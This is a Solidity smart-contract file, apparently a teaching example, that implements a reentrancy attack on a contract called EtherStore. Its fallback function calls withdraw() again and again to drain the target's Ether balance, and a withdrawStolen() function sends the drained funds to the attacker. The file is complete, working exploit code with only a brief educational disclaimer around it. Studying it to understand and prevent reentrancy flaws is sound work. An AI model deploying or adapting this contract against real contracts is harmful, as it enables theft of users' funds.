// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./EtherStore.sol";

/// @title Attack Contract for EtherStore
/// @author Ishan Lakhwani
/// @notice This contract demonstrates how to exploit the reentrancy vulnerability
/// @dev This is for educational purposes only

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    function withdrawStolen() external {
        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to withdraw");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
